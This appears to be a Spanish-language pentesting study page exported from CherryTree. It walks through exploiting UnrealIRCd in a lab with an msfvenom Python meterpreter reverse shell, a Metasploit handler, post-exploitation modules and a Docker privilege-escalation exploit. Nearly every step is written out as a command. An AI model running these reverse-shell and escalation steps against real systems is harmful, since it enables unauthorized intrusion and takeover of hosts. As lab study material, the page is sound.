<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux meterpreter</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux meterpreter</h1><br/><p></p><p><strong><h1>LINUX:</h1></strong></p><p></p><p>Para poder ver donde se encuentran los módulos en metasploit:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">cd</span> <span style="color:#000000;font-weight:700">/</span>usr<span style="color:#000000;font-weight:700">/</span>share<span style="color:#000000;font-weight:700">/</span>metasploit-framewor<span style="color:#000000;font-weight:700">/</span>modules<span style="color:#000000;font-weight:700">/</span>post</pre></div></p><p></p><p><img src="images/140-1.png" alt="images/140-1.png" /></p><p></p><p>Para realizar esta prueba vamos a explotar la vulnerabilidad de UnrealIRC con un payload personalizado para generar un meterpreter.</p><p></p><p><div class="codebox"><pre><br />msfvenom -p python<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp lhost=192.168.20.130 lport=5555</pre></div></p><p></p><p>En el exploit que vimos anteriormente modificamos el payload de python:</p><p></p><p><img src="images/140-2.png" alt="images/140-2.png" /></p><p></p><p>Configuramos un listener en Metasploit.</p><p></p><p><div class="codebox"><pre><br />use exploit<span style="color:#000000;font-weight:700">/</span>multi<span style="color:#000000;font-weight:700">/</span>handler<br /><span style="color:#000000;font-weight:700">set</span> payload python<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp<br /><span style="color:#000000;font-weight:700">set</span> lhost 192.168.20.130<br /><span style="color:#000000;font-weight:700">set</span> lport 5555<br /></pre></div></p><p></p><p><img src="images/140-3.png" alt="images/140-3.png" /></p><p></p><p>Ejecutamos exploit.</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">/</span>exploit.py 192.168.20.128 6667 -payload python</pre></div></p><p></p><p><img src="images/140-4.png" alt="images/140-4.png" /></p><p></p><p><img src="images/140-5.png" alt="images/140-5.png" /></p><p></p><p>Dentro de la máquina ya vulnerada es cuando podemos usar los módulos anteriores: </p><p></p><p><img src="images/140-6.png" alt="images/140-6.png" /></p><p></p><p>Por ejemplo:</p><p></p><p><div class="codebox"><pre><br />run post<span style="color:#000000;font-weight:700">/</span>linux<span style="color:#000000;font-weight:700">/</span>gather<span style="color:#000000;font-weight:700">/</span>checkvm</pre></div></p><p></p><p><img src="images/140-7.png" alt="images/140-7.png" /></p><p></p><p>Vamos a intentar escalar privilegios con otros exploits.</p><p></p><p>Mandamos la sesión meterpreter activa a un segundo plano.</p><p></p><p><img src="images/140-8.png" alt="images/140-8.png" /></p><p></p><p>Utilizamos un recomendador:</p><p></p><p><div class="codebox"><pre><br />use post<span style="color:#000000;font-weight:700">/</span>multi<span style="color:#000000;font-weight:700">/</span>recon<span style="color:#000000;font-weight:700">/</span>local_exploit_suggester<br />show options<br /><span style="color:#000000;font-weight:700">set</span> session 1<br />exploit<br /></pre></div></p><p></p><p>Lo que hace es de forma automática recolecta exploits que puedan ser compatibles con la máquina objetivo.</p><p></p><p><img src="images/140-9.png" alt="images/140-9.png" /></p><p></p><p>Vamos a utilizar el numero 4.</p><p></p><p><div class="codebox"><pre><br />use exploit<span style="color:#000000;font-weight:700">/</span>linux<span style="color:#000000;font-weight:700">/</span>local<span style="color:#000000;font-weight:700">/</span>docker_daemon_privilege_escalation<br /><span style="color:#000000;font-weight:700">set</span> session 1<br /><span style="color:#000000;font-weight:700">set</span> lhost 192.168.20.130<br /><span style="color:#000000;font-weight:700">set</span> payload linux<span style="color:#000000;font-weight:700">/</span>x86<span style="color:#000000;font-weight:700">/</span>meterpreter<span style="color:#000000;font-weight:700">/</span>reverse_tcp<br /></pre></div></p><p></p><p>Este exploit se encarga de ejecutarse en esa sesión 1 sin privilegios y nos devuelve otro meterpreter con privilegios escalados.</p><p></p><p><img src="images/140-10.png" alt="images/140-10.png" /></p><p></p><p><img src="images/140-11.png" alt="images/140-11.png" /></p><p></p></div>
</body>
</html>
